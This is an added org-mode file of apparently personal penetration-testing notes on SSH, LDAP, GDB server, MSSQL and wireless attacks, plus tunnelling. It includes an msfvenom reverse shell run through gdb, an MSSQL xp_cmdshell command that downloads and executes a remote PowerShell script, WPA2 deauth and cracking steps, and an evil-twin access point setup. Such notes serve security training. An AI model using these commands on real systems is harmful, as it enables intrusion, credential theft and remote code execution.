@@ -1,0 +1,201 @@
+#+TITLE: Network stuff
+#+INCLUDE: ../../../templates/rtfsg.org
+
+* Common Protocols
+:PROPERTIES:
+:CUSTOM_ID: protocols
+:END:
+*** SSH - port 22
+:PROPERTIES:
+:CUSTOM_ID: ssh
+:END:
+***** Check SSH configuration
+
+- [[https://github.com/arthepsy/ssh-audit][ssh-audit]] for detailed fingerprinting
+
+***** Bruteforcing credentials
+
+Use metasploit's ~auxiliary/scanner/ssh/ssh_login~ or [[https://github.com/byt3bl33d3r/CrackMapExec][CrackMapExec]].
+
+***** Bypass login shell
+
+To bypass restrictive login shells such as ~/usr/bin/nologin~ or
+~/usr/bin/false~ you can add your own command while connecting upon SSH that
+will be executed before the user drops into the assigned login shell. ~/bin/sh~
+is always a good candidate.
+
+#+begin_src shell
+ssh user@target /bin/sh
+#+end_src
+
+***** libssh authentication bypass
+
+
+Use the python [[https://www.exploit-db.com/exploits/46307][script]] from exploit-db.com or metasploit's
+~auxiliary/scanner/ssh/libssh_auth_bypass~ to exploit an authentication bypass
+present in libssh before versions 0.7.6 and 0.8.4 ([[https://www.cvedetails.com/cve/CVE-2018-10933][CVE-2018-10933]]).
+
+***** Debian OpenSSL Predictable PRNG (CVE-2008-0166)
+
+At some point in 2008, Debian shipped a buggy OpenSSL implementation. This bug
+biaised the seeds used by OpenSSL's PRNG, resulting in only 32,767 possible
+seeds for a given architecture, key size and key type.
+
+[[https://github.com/g0tmi1k/debian-ssh][g0tm1lk]] generated the possible keys which can further be exploited with [[https://www.exploit-db.com/exploits/5720][this
+python script]].
+
+***** Tools & resources
+
+Utilities:
+
+- [[https://github.com/sshuttle/sshuttle][sshuttle]]: proxy allthethings over ssh.
+
+Configuration guides:
+
+- [[https://infosec.mozilla.org/guidelines/openssh][Mozilla's guidelines on OpenSSH configuration]].
+
+*** SSL/TLS
+:PROPERTIES:
+:CUSTOM_ID: ssl
+:END:
+***** Check SSL/TLS configuration
+
+- [[https://testssl.sh/][testssl.sh]]: very exhaustive checks.
+- [[https://github.com/rbsec/sslscan/][sslscan]].
+- Mozilla SSL/TLS [[https://wiki.mozilla.org/Security/Server_Side_TLS][guidelines]] and [[https://ssl-config.mozilla.org/][configuration generator]].
+
+*** LDAP
+***** Enumeration
+
+[[https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap][Hacktricks on LDAP]].
+
+#+begin_src shell
+nmap --script="ldap* and not brute" 10.10.10.1 | tee detailed_ldap.txt | grep Context
+ldapsearch -x -H ldap://10.10.10.1 -D '' -w '' -b "DC=abc,DC=xyz" | tee ldapsearch.txt
+#+end_src
+
+***** LDAP Pass-Back Attack
+
+This attacks relies on tricking a device to connect to a rogue LDAP server
+operated by the attacker. The server is configured so that only plaintext
+credentials are accepted, hence capturing the credentials from the connecting
+service.
+
+The setup for the attack is described [[https://medium.com/r3d-buck3t/pwning-printers-with-ldap-pass-back-attack-a0d8fa495210][here]]. Below are the steps for ArchLinux
+(make sure to check out Arch's wiki entry for [[https://wiki.archlinux.org/title/OpenLDAP][OpenLDAP]] in parallel).
+
+#+begin_src shell
+
+#+end_src
+
+*** GDB server
+
+It is possible to obtain remote command execution when a gdb instance is
+listening. There are several exploits available but this can also be achieved
+manually. To do so we simply transfer an executable onto the target, reverse
+shells are juicy candidates, and ask gdb to debug it.
+
+#+begin_src sh
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o evil
+gdb
+gdb$ target extended-remote <target>:<port>
+gdb$ remote put evil evil
+gdb$ set remote exec-file evil
+gdb$ run
+#+end_src
+
+*** DNS rebinding
+
+-[[https://lock.cmpxchg8b.com/rebinder.html][rbndr.us]] rebinding service.
+
+*** Crack P12 (PKCS12) certificate passwords
+
+- [[https://github.com/Ridter/p12tool][p12tool]] (go).
+
+*** Microsoft SQL Server (MSSQL)
+
+Once authenticated, upload and execute a reverse shell with impacket's
+=mssqlclient.py=.
+
+#+begin_src shell
+mssqlclient.py sa:poiuytrewq@10.11.1.31
+SQL> xp_cmdshell "powershell IEX(New-Object Net.webclient).downloadString(\"http://192.168.119.184:8088/hey.ps1\")"
+#+end_src
+
+* Wireless
+:PROPERTIES:
+:CUSTOM_ID: wireless
+:END:
+*** Recon
+
+Turn an interface into monitor mode and start sniffing for networks in range.
+
+#+begin_src sh
+# list available interfaces
+airmon-ng
+ip a
+# set interface to monitor mode
+airmon-ng start <inferface>
+# capture into all_traffic.pcap
+airodump-ng -w all_traffic <inferface>mon
+tcpdump -i <interface>mon -w app_traffic.pcap
+#+end_src
+
+*** WPA2-PSK capturing and cracking
+
+1) Select a target network and wait for the capture of WPA2 handshakes.
+2) If needed, activelty de-auth clients to capture handshakes upon their
+   reconnection.
+3) Use aircrack-ng / john / hashcat to crack the WPA2 master key from the
+   handshakes.
+
+#+begin_src sh
+# Sniff <bssid> on a single <channel> and store into <target>.pcap
+airodump-ng -c <channel> --bssid <bssid> -w <target> <interface>mon
+
+# De-auth up to <nb> stations to capture auth packets for good
+aireplay-ng -0 <nb> -a <target bssid> <interface>mon
+
+# Taxi, crack that key!
+aircrack-ng -a 2 -w /path/to/dictionary.txt target.pcap
+#+end_src
+
+*** Attacking WPA2-MGT with Evil Twin
+
+It requires two wireless interfaces: one connected to internet or to the target
+network and another, ideally powerful, interface that will server as an access
+point. [[https://github.com/s0lst1c3/eaphammer/wiki][eaphammer]] can be used to generate a certificate and then run a fake
+WPA2-MGMT access point replicating the target's ESSID and BSSID. The attacker
+gets complete control over every client's traffic which connects to the rogue
+access point without checking the certificate against a trusted one.
+
+#+begin_src shell
+$ eaphammer --cert-wizard
+$ eaphammer -i wlan0 -I wlan1 --essid "Target" --bssid 01:02:03:aa:bb:cc
+#+end_src
+
+* Port forwarding and reverse shells
+*** Chisel
+
+[[https://github.com/jpillora/chisel][chisel]] is another networking swiss army knife (get precompiled binaries from the
+[[https://github.com/jpillora/chisel/releases][release page]]).
+
+#+begin_src shell
+# On local machine
+./chisel server -p 7777 --reverse
+# On remote
+./chisel client 10.10.1.2:7777 R:5985:10.10.3.4:5985
+#+end_src
+
+
+*** Socat cheatsheet
+
+You can retrieve compiled executables for socat on the wonderful [[https://github.com/andrew-d/static-binaries][static-binaries]]
+project: [[https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat][linux x86_64]]
+
+First, check out [[https://cheat.sh/socat][cheat.sh/socat]] for cool usage tips. Below are the ones I use
+the most.
+
+#+begin_src shell
+
+#+end_src
